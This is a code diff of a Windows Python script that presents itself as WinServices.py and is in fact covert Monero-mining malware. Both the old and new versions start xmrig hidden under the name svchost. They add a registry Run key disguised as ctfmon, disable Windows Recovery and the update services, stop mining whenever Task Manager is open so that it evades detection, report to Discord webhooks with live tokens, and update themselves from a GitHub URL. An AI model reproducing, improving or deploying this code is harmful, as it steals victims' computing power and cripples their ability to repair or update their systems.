@@ -1,99 +1,169 @@
-import os, sys, subprocess, random, time, winreg, ctypes, json, platform, threading, base64
-from urllib import request
+import os, sys, subprocess
 
-# --- CONFIG (V14.0 - THE ETERNAL HYDRA) ---
-W_S = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
-W_M = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPvYeiAfT9nIB25FPR4k-MoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
-ID = "svchost"
-WORK_DIR = os.path.dirname(os.path.realpath(__file__))
-MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe")
+# --- THE HYDRA ENGINE (WinServices.py v6.3 - INDIVIDUAL WORKERS) ---
+# This flag tells Windows: "Do NOT show a console window."
+HIDE_WINDOW = 0x08000000 
+
+# --- 0. THE VOICE FIX (BOOTSTRAP) ---
+def bootstrap():
+    """Ensures the engine has its voice with ZERO windows."""
+    try:
+        import requests, psutil
+    except ImportError:
+        work_dir = os.path.dirname(os.path.realpath(sys.executable))
+        lib_path = os.path.join(work_dir, "Lib", "site-packages")
+        if not os.path.exists(lib_path): os.makedirs(lib_path)
+        
+        # FIX 1: Hide the Pip Install window
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--target", lib_path], 
+                              creationflags=HIDE_WINDOW)
+        
+        # Restart to recognize the new voice
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+
+bootstrap()
+
+# --- NOW WE CAN IMPORT EVERYTHING ---
+import time, winreg, base64, argparse, platform, ctypes
+import requests, psutil
+
+# --- 1. Identity & Dual Webhook Setup ---
+parser = argparse.ArgumentParser()
+parser.add_argument("--id", default="svchost")
+ID = parser.parse_known_args()[0].id
+
+# CONFIG - YOUR INFO IS LOCKED IN
+WEBHOOK_SYS = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
+WEBHOOK_MINE = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPyYeiAfT9nIB25FPR4kMoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
-RAW_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
+UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
 
-# Encoded service names for light obfuscation (wuauserv, bits, dosvc)
-SVC_L = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="] 
+# Obfuscated Strings
+REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
+SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]
+PC_NAME = platform.node()
+WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
+SELF_PATH = os.path.realpath(__file__)
 
-os.chdir(WORK_DIR)
+CONFIG = {
+    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
+    "WATCH": "Taskmgr.exe",
+    "IDLE_PWR": "90",  # 90% when truly idle
+    "NORM_PWR": "25",  # 25% when user is active
+    "IDLE_SEC": 300    # 5 minutes of no input = Idle
+}
 
-def notify(msg, type="sys"):
-    hook = W_S if type == "sys" else W_M
-    try:
-        data = json.dumps({"content": f"**[{platform.node()}]**: {msg}"}).encode('utf-8')
-        req = request.Request(hook, data=data, headers={'Content-Type': 'application/json'})
-        request.urlopen(req, timeout=10)
-    except: pass
-
-def auto_update():
-    """V14.0 Evolution Logic: Self-Update from GitHub"""
-    while True:
-        try:
-            time.sleep(43200) # 12 Hours
-            with request.urlopen(RAW_URL) as response:
-                new_code = response.read().decode('utf-8')
-            with open(os.path.realpath(__file__), 'r') as f:
-                current_code = f.read()
-            if new_code != current_code:
-                with open(os.path.realpath(__file__), 'w') as f:
-                    f.write(new_code)
-                notify("Evolution triggered. Restarting engine.", "sys")
-                os.execv(sys.executable, [sys.executable, os.path.realpath(__file__)])
-        except: pass
-
-def engage_locks():
-    """V14.0 Sabotage Logic: Disable Recovery and Update Services"""
-    try:
-        # Disable Windows Recovery Environment
-        subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
-        # Disable Update Services
-        for s in SVC_L:
-            name = base64.b64decode(s).decode()
-            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=0x08000000)
-            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=0x08000000)
-    except: pass
-
-def is_running(name):
-    try:
-        output = subprocess.check_output('tasklist', creationflags=0x08000000).decode()
-        return name.lower() in output.lower()
-    except: return False
-
+# --- 2. THE TRUE IDLE SENSOR (Windows API) ---
 class LASTINPUTINFO(ctypes.Structure):
     _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
 
-def get_idle():
+def get_idle_duration():
+    """Returns how many seconds since the last mouse/keyboard movement."""
     lii = LASTINPUTINFO()
     lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
     if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
-        return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0
+        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
+        return millis / 1000.0
     return 0
 
-def manage():
-    # Detect monitoring tools
-    if is_running("Taskmgr.exe") or is_running("ProcessHacker.exe"):
-        if is_running("xmrig.exe"):
-            subprocess.run('taskkill /F /IM xmrig.exe', creationflags=0x08000000, shell=True)
+def notify(msg, type="sys"):
+    hook = WEBHOOK_SYS if type == "sys" else WEBHOOK_MINE
+    full_msg = f"**[{PC_NAME} | {ID}]**: {msg}"
+    try: requests.post(hook, json={"content": full_msg})
+    except: pass
+
+# --- 3. System Sovereignty & Persistence ---
+def engage_locks():
+    """Persistence, Reset Disable, and Update Lockdown with ZERO windows."""
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
+        py_path = os.path.join(WORK_DIR, "python", "ctfmon.exe")
+        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{py_path}" "{SELF_PATH}" --id {ID}')
+        winreg.CloseKey(key)
+        notify("Persistence Verified (ctfmon mask active).", "sys")
+    except: pass
+    
+    try:
+        subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=HIDE_WINDOW)
+        notify("Windows Recovery Environment disabled.", "sys")
+    except: pass
+    
+    try:
+        for s in SVC_LIST:
+            name = base64.b64decode(s).decode()
+            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=HIDE_WINDOW)
+            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=HIDE_WINDOW)
+        notify("Windows Updates locked.", "sys")
+    except: pass
+
+# --- 4. Auto-Updater ---
+def auto_update():
+    """Checks GitHub for a newer version and restarts if found."""
+    try:
+        r = requests.get(UPDATE_URL)
+        if r.status_code == 200:
+            current_content = open(SELF_PATH, 'r').read()
+            if r.text != current_content:
+                with open(SELF_PATH, 'w') as f: f.write(r.text)
+                notify("Shadow Sync: New version detected. Respawning...", "sys")
+                os.execv(sys.executable, [sys.executable, SELF_PATH, "--id", ID])
+    except: pass
+
+# --- 5. Smart Throttle & HYDRA RESURRECTION ---
+def manage_power():
+    """Hides from Taskmgr and toggles 90/25 power based on TRUE IDLE and RESURRECTION."""
+    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
+    
+    miner_proc = None
+    current_power = "0"
+    for p in psutil.process_iter(['name', 'exe', 'cmdline']):
+        try:
+            if p.info['name'] == f"{ID}.exe" and p.info['exe'] and os.path.normpath(p.info['exe']) == os.path.normpath(CONFIG["MINER"]):
+                miner_proc = p
+                for arg in p.info['cmdline']:
+                    if arg == CONFIG["IDLE_PWR"] or arg == CONFIG["NORM_PWR"]:
+                        current_power = arg
+                break
+        except: continue
+
+    if is_monitored:
+        if miner_proc:
+            try: 
+                miner_proc.terminate()
+                notify("Monitoring detected. Vanishing.", "sys")
+            except: pass
     else:
-        # Start or adjust power (90/30 split)
-        if not is_running("xmrig.exe"):
-            if os.path.exists(MIN_BIN):
-                idle = get_idle()
-                pwr = "90" if idle > 300 else "30"
-                subprocess.Popen([
-                    MIN_BIN, "-o", POOL, "-u", WALLET + "." + platform.node(), 
-                    "--max-cpu-usage", pwr, "-k", "--tls"
-                ], creationflags=0x08000000)
-                notify(f"Engine Engaged. Mode: {'Idle' if idle > 300 else 'Active'} (Power: {pwr}%)", "mine")
+        idle_time = get_idle_duration()
+        target_pwr = CONFIG["IDLE_PWR"] if idle_time > CONFIG["IDLE_SEC"] else CONFIG["NORM_PWR"]
+        
+        if not miner_proc or current_power != target_pwr:
+            if miner_proc:
+                try: miner_proc.terminate()
+                except: pass
+                
+            try:
+                # --- THE WORKER FIX ---
+                # We append the PC_NAME to the WALLET address so SupportXMR tracks them individually
+                worker_id = f"{WALLET}.{PC_NAME}"
+                
+                subprocess.Popen([CONFIG["MINER"], "-o", POOL, "-u", worker_id, "--max-cpu-usage", target_pwr, "-k", "--tls"], 
+                                 creationflags=HIDE_WINDOW)
+                notify(f"Watchdog: Engine Engaged. Power: {target_pwr}% (Worker: {PC_NAME})", "mine")
+            except Exception as e:
+                notify(f"Engine Failed: {str(e)}", "sys")
 
 def main():
-    threading.Thread(target=auto_update, daemon=True).start()
     engage_locks()
-    notify("THE ETERNAL HYDRA v14.0 ONLINE", "sys")
+    notify("SYSTEM ONLINE (v6.3 - Individual Worker Mode)", "sys")
+    last_update = time.time()
+    
     while True:
-        try:
-            manage()
-        except: pass
-        time.sleep(20)
+        manage_power()
+        if time.time() - last_update > 43200:
+            auto_update()
+            last_update = time.time()
+        time.sleep(10)
 
 if __name__ == "__main__":
     main()
